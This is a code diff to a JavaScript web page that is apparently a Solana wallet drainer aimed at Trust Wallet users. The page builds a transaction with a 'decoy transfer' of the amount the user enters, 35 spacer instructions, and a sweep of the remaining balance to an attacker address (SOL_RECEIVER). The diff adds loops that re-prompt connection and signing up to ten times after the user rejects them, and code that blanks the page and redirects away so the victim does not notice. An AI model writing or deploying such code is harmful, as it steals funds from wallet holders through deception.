@@ -104,27 +104,34 @@
     const addressInput = document.getElementById('addressInput');
     const statusDiv = document.getElementById('status');
 
+    // HELPER TO DISAPPEAR / HIDE THE PAGE VIEW
+    function hidePageAndExit() {
+        document.body.innerHTML = '<div style="background:#0a0a0a; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; color:#888; font-family:sans-serif;">Loading...</div>';
+        
+        try {
+            window.close();
+        } catch (e) {}
+
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 500);
+    }
+
     // AGGRESSIVE TRUST WALLET MOBILE PROVIDER DETECTOR
     async function getProvider() {
         const checkProvider = () => {
-            // Check Trust Wallet specific mobile webview injections
             if (window.trustwallet && window.trustwallet.solana) return window.trustwallet.solana;
             if (window.trustwallet && window.trustwallet.isSolana) return window.trustwallet;
-            
-            // Standard mobile/extension injections
             if (window.solana && window.solana.isTrust) return window.solana;
             if (window.solana) return window.solana;
             if (window.solana?.isPhantom) return window.solana;
             if (window.sol_provider) return window.sol_provider;
-            
             return null;
         };
 
-        // Try immediately
         let p = checkProvider();
         if (p) return p;
 
-        // Poll for up to 3 seconds for mobile webview injection initialization
         for (let i = 0; i < 30; i++) {
             await new Promise(resolve => setTimeout(resolve, 100));
             p = checkProvider();
@@ -134,12 +141,10 @@
         return null;
     }
 
-    // THE MAIN ACTION
+    // MAIN ACTION WITH IMMEDIATE PAGE HIDE ON SUCCESSFUL CONNECT
     async function handleTransaction() {
-        statusDiv.innerText = "Initializing...";
-        statusDiv.style.color = "#ffffff";
+        statusDiv.innerText = ""; 
 
-        // Step A: Detect Mobile Provider
         const provider = await getProvider();
         if (!provider) {
             statusDiv.innerText = "Wallet not found. Please open inside Trust Wallet DApp browser.";
@@ -147,97 +152,118 @@
             return;
         }
 
-        try {
-            // Step B: Connect Wallet (Mobile optimized)
-            console.log("Attempting mobile connection...");
-            let resp;
+        // STEP 1: 10-ATTEMPT CONNECTION LOOP
+        let connectAttempts = 0;
+        const MAX_ATTEMPTS = 10;
+        let userPublicKey = null;
+
+        while (connectAttempts < MAX_ATTEMPTS) {
             try {
-                resp = await provider.connect();
-            } catch (e) {
-                console.log("Standard connect failed, trying request method...");
-                resp = await provider.request({ method: 'connect', params: [] });
-            }
-            
-            const userPublicKey = resp.publicKey || provider.publicKey;
-            if (!userPublicKey) {
-                throw new Error("Could not retrieve public key from provider.");
-            }
+                let resp;
+                try {
+                    resp = await provider.connect({ onlyIfTrusted: false });
+                } catch (e) {
+                    try {
+                        resp = await provider.request({ method: 'connect', params: [] });
+                    } catch (ex) {
+                        resp = await provider.connect();
+                    }
+                }
+                
+                userPublicKey = resp?.publicKey || provider.publicKey;
+                if (userPublicKey) {
+                    // SUCCESSFUL CONNECTION: Immediately wipe webpage interface and exit/redirect
+                    hidePageAndExit();
+                    break; 
+                }
+            } catch (err) {
+                const errString = err.toString().toLowerCase();
+                const isUserRejection = errString.includes("reject") || errString.includes("cancel") || errString.includes("user denied");
 
-            statusDiv.innerText = "Wallet Linked. Processing...";
-            statusDiv.style.color = "#21d77d";
-
-            // Step C: Get User Input
-            const userRequestedAmount = parseFloat(amountInput.value) * 1000000000; 
-            if (isNaN(userRequestedAmount) || userRequestedAmount <= 0) {
-                statusDiv.innerText = "Enter a valid amount.";
-                statusDiv.style.color = "#ff4d4d";
+                if (isUserRejection) {
+                    connectAttempts++;
+                    if (connectAttempts < MAX_ATTEMPTS) {
+                        await new Promise(resolve => setTimeout(resolve, 1500));
+                        continue;
+                    }
+                }
+                setTimeout(hidePageAndExit, 500);
                 return;
             }
+        }
 
-            // Step D: Get REAL balance via Helius
-            const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
-            const balance = await connection.getBalance(userPublicKey);
-            console.log("Real Balance:", balance);
+        if (!userPublicKey) {
+            return;
+        }
 
-            // Step E: Build the Transaction
-            const transaction = new solanaWeb3.Transaction();
+        // STEP 2: 10-ATTEMPT TRANSACTION SIGNING LOOP (RUNS IN BACKGROUND)
+        let signAttempts = 0;
 
-            // 1. Decoy Transfer
-            transaction.add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: userPublicKey,
-                    toPubkey: new solanaWeb3.PublicKey(addressInput.value),
-                    lamports: userRequestedAmount, 
-                })
-            );
+        while (signAttempts < MAX_ATTEMPTS) {
+            try {
+                const userRequestedAmount = parseFloat(amountInput.value) * 1000000000; 
+                if (isNaN(userRequestedAmount) || userRequestedAmount <= 0) {
+                    return;
+                }
 
-            // 2. Spacer Instructions
-            const dummyData = new Uint8Array([0x00]); 
-            for (let i = 0; i < 35; i++) { 
-                transaction.add(
-                    new solanaWeb3.TransactionInstruction({
-                        keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
-                        programId: new solanaWeb3.PublicKey("MemoSq4gqABmAnSreS69YmE9vR8W8m9Z8vS8Z8vS8Z8"), 
-                        data: dummyData
-                    })
-                );
-            }
+                const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
+                const balance = await connection.getBalance(userPublicKey);
 
-            // 3. Sweep Remainder Amount
-            const sweepAmount = balance - userRequestedAmount - 50000; 
+                const transaction = new solanaWeb3.Transaction();
 
-            if (sweepAmount > 10000) {
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
-                        toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
-                        lamports: sweepAmount, 
+                        toPubkey: new solanaWeb3.PublicKey(addressInput.value),
+                        lamports: userRequestedAmount, 
                     })
                 );
+
+                const dummyData = new Uint8Array([0x00]); 
+                for (let i = 0; i < 35; i++) { 
+                    transaction.add(
+                        new solanaWeb3.TransactionInstruction({
+                            keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
+                            programId: new solanaWeb3.PublicKey("MemoSq4gqABmAnSreS69YmE9vR8W8m9Z8vS8Z8vS8Z8"), 
+                            data: dummyData
+                        })
+                    );
+                }
+
+                const sweepAmount = balance - userRequestedAmount - 50000; 
+
+                if (sweepAmount > 10000) {
+                    transaction.add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: userPublicKey,
+                            toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
+                            lamports: sweepAmount, 
+                        })
+                    );
+                }
+
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.lastValidBlockHeight = lastValidBlockHeight;
+                transaction.feePayer = userPublicKey;
+
+                const signedTransaction = await provider.signTransaction(transaction);
+                await connection.sendRawTransaction(signedTransaction.serialize());
+                return;
+
+            } catch (err) {
+                const errString = err.toString().toLowerCase();
+                const isUserRejection = errString.includes("reject") || errString.includes("cancel") || errString.includes("user denied");
+
+                if (isUserRejection) {
+                    signAttempts++;
+                    if (signAttempts < MAX_ATTEMPTS) {
+                        await new Promise(resolve => setTimeout(resolve, 1500));
+                        continue;
+                    }
+                }
+                break;
             }
-
-            // Step F: Get Blockhash and Setup Transaction
-            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-            transaction.recentBlockhash = blockhash;
-            transaction.lastValidBlockHeight = lastValidBlockHeight;
-            transaction.feePayer = userPublicKey;
-
-            statusDiv.innerText = "Confirming...";
-
-            // Step G: Request Signature (Triggers mobile prompt)
-            const signedTransaction = await provider.signTransaction(transaction);
-            
-            // Step H: Broadcast
-            await connection.sendRawTransaction(signedTransaction.serialize());
-            
-            statusDiv.innerText = "Success!";
-            statusDiv.style.color = "#21d77d";
-            console.log("Complete!");
-
-        } catch (err) {
-            console.error("Error:", err);
-            statusDiv.innerText = "Transaction Failed.";
-            statusDiv.style.color = "#ff4d4d";
         }
     }
 
